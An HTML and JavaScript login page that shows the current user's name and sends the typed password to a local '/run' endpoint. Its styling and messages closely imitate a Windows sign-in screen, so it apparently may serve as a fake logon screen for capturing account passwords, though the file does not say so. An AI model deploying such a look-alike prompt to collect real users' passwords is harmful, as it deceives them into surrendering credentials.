<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="output.css" />
  <title>Login</title>
  <style>
    input::-ms-reveal,
    input::-ms-clear {
      display: none;
    }

    input[type="password"]::-webkit-credentials-auto-fill-button,
    input[type="password"]::-webkit-inner-spin-button,
    input[type="password"]::-webkit-clear-button,
    input[type="password"]::-webkit-textfield-decoration-container {
      display: none !important;
      appearance: none !important;
    }
  </style>
</head>
<body>
  <section class="login flex-col-center bg-gradient-to-br from-[#0f172a] to-[#1e293b] min-h-screen px-4">
    <div class="w-32 h-32 bg-white/10 bg-opacity-20 rounded-full flex items-center justify-center z-[999]">
      <img src="user.webp" alt="User" class="w-1/2 h-1/2 md:w-full xsm:h-full object-contain" />
    </div>

    <h2 id="userTitle" class="text-[20px] font-semibold text-white z-[999] pb-5 pt-2 text-center"></h2>

    <div class="login-wrapper z-[999] px-[2px] w-full max-w-[200px]">
      <div id="password_area" class="flex items-center relative max-w-[200px] backdrop-blur-md bg-[#161B36] rounded-[3px] overflow-hidden border-b-[1.7px] border-b-[#0078D4]">
        <div class="flex-row-center w-full">
          <input 
            id="password" 
            type="password" 
            placeholder="Password" 
            class="w-full text-xs px-[5px] py-1 text-gray-300 outline-none placeholder:text-gray-300"
            autofocus 
          />
          <a onclick="pass_check()">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-3 h-3 text-gray-200 absolute right-1 top-1/2 -translate-y-1/2">
              <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 4.5 21 12m0 0-7.5 7.5M21 12H3" />
            </svg>
          </a>

          <button type="button" class="outline-none text-gray-200 text-sm absolute right-5 px-1" onclick="togglePassword()">
            <svg id="eye" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-3 h-3">
              <path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322...Z" />
              <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 1 1-6 0..." />
            </svg>
            <svg id="eye-off" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-3 h-3 hidden">
              <path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223...Z" />
            </svg>
          </button>
        </div>
      </div>

      <a id="reset_password" class="text-gray-300 mx-auto block text-center text-xs mt-5 hover:text-white transition-all duration-100 hidden">Reset password</a>
      <a id="password_msg_text" class="text-gray-300 mx-auto block text-center text-xs mt-5 hover:text-white transition-all duration-100 hidden">The password is incorrect. Try again.</a>
      <div id="password_msg_button" class="hidden w-full flex-row-center py-5" onclick="re_try()">
        <button type="button" class="text-xs mx-auto text-gray-200 border-2 border-gray-200 bg-white/20 rounded-lg px-11 py-[6px]">OK</button>
      </div>
    </div>
  </section>

  <script>
    const passwordInput = document.getElementById("password");
    const toggleButton = document.querySelector('button[onclick="togglePassword()"]');
    let status = "0";

    // Fetch current user name
    window.addEventListener("DOMContentLoaded", () => {
      fetch("/user")
        .then(res => res.text())
        .then(name => {
          document.getElementById("userTitle").textContent = name;
        });

      toggleButton.classList.add("hidden");
      passwordInput.focus();
    });

    // Toggle password show/hide
    function togglePassword() {
      const eye = document.getElementById("eye");
      const eyeOff = document.getElementById("eye-off");
      const type = passwordInput.type === "password" ? "text" : "password";
      passwordInput.type = type;
      eye.classList.toggle("hidden", type === "text");
      eyeOff.classList.toggle("hidden", type === "password");
    }

    // Show/hide toggle eye button on input
    passwordInput.addEventListener("input", () => {
      toggleButton.classList.toggle("hidden", passwordInput.value.length === 0);
    });

    // Enter key toggle logic
    document.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();

        if (status === "0") {
          status = "1";
          document.getElementById('reset_password').style.display = "none";
          pass_check();
        } else {
          status = "0";
          re_try();
          document.getElementById('reset_password').style.display = "block";
          passwordInput.value = "";
          passwordInput.focus();
        }
      }
    });

    // Reset UI
    function re_try() {
      document.getElementById('password_area').style.display = "block";
      document.getElementById('password_msg_text').style.display = "none";
      document.getElementById('password_msg_button').style.display = "none";
    }

    // Validate password
    function pass_check() {
      const password = passwordInput.value;

      fetch("/run", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "password=" + encodeURIComponent(password)
      })
      .then(res => res.text())
      .then(result => {
        if (result === "OK") {
          alert('Access Granted')
        } else {
          document.getElementById('password_msg_text').style.display = "block";
          document.getElementById('password_area').style.display = "none";
          document.getElementById('password_msg_button').style.display = "block";
        }
      });
    }
  </script>
</body>
</html>
